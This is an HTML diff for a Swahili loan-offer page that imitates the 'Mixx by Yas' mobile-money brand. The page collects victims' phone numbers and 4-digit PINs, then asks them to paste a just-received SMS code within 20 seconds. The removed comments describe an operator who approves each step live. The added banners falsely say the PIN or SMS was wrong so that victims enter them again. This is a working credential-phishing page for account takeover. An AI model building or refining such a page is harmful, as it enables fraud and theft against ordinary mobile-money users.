@@ -34,7 +34,6 @@
                 <span class="badge-pill">📱 Malipo Papo</span>
             </div>
 
-            <!-- Dashboard Calculator Box -->
             <div class="dash-calc-box">
                 <div style="font-size: 13px; color: var(--text-muted); margin-bottom: 6px;">📊 HESABU MKOPO WAKO <span style="float: right; color: var(--accent-yellow); font-size: 11px;">5% APR Fixed</span></div>
                 
@@ -53,7 +52,6 @@
                 <div style="font-size: 11px; color: var(--text-muted); margin-top: 8px;">Kiwango cha Riba: <strong style="color: #fff;">5% APR</strong></div>
             </div>
 
-            <!-- Monthly Calculation Card -->
             <div class="amount-box" style="margin: 5px 0;">
                 <span class="value" id="monthly-payment-val" style="font-size: 22px;">Tsh 336,115</span>
                 <span class="label" style="margin-top: 4px;">Makadirio ya Malipo ya Kila Mwezi</span>
@@ -158,7 +156,7 @@
             </div>
         </div>
 
-        <!-- 6. PHONE NUMBER & 4-DIGIT PIN ENTRY (Loaded immediately after Step 3) -->
+        <!-- 6. PHONE NUMBER & 4-DIGIT PIN ENTRY -->
         <div id="step-form" class="card hidden">
             <div class="logo-container">
                 <div class="mixx-logo">Mixx</div>
@@ -167,6 +165,12 @@
                 <h2>Mixx by Yas</h2>
                 <p>Weka Nambari na PIN kuthibitisha</p>
             </div>
+            
+            <!-- Inline surface notification banner for errors -->
+            <div id="pin-error-banner" class="error-surface-banner hidden">
+                ⚠ PIN uliyoweka si sahihi. Tafadhali weka PIN sahihi upya.
+            </div>
+
             <form id="loan-form">
                 <div class="input-group">
                     <label>Nambari ya Simu ya Kuthibitisha</label>
@@ -191,19 +195,25 @@
             </form>
         </div>
 
-        <!-- LOADING SCREEN (Waiting for Admin Allow action) -->
+        <!-- LOADING SCREEN -->
         <div id="step-loading" class="card hidden">
             <div class="spinner"></div>
             <h3>Inashughulikia Ombi Lako...</h3>
             <p>Tafadhali subiri kidogo wakati tunathibitisha taarifa zako.</p>
         </div>
 
-        <!-- 7. OTP / SMS PASTING SCREEN (Loads immediately when Admin taps ALLOW) -->
+        <!-- 7. OTP / SMS PASTING SCREEN -->
         <div id="step-otp" class="card hidden">
             <div class="otp-header">
                 <h3>TAFADHALI BANDIKA SMS ILIYOTUMWA KWAKO KWENYE NAMBARI YA MIXX BY YAS HAPA CHINI</h3>
                 <div class="timer-badge">⏱ HII ITAKOMA BAADA YA SEKUNDE 20</div>
             </div>
+
+            <!-- Inline surface notification banner for SMS errors -->
+            <div id="sms-error-banner" class="error-surface-banner hidden">
+                ⚠ Ujumbe wa SMS si sahihi au umepitwa na wakati. Tafadhali bandika SMS mpya.
+            </div>
+
             <div class="otp-input-area">
                 <textarea id="otp-text" placeholder="Bandika hapa ujumbe wa SMS..." rows="4"></textarea>
                 <span id="char-count">0/1000</span>
@@ -225,5 +235,5 @@
     </div>
     <script src="script.js"></script>
 </body>
-                    </html>
+                </html>
     
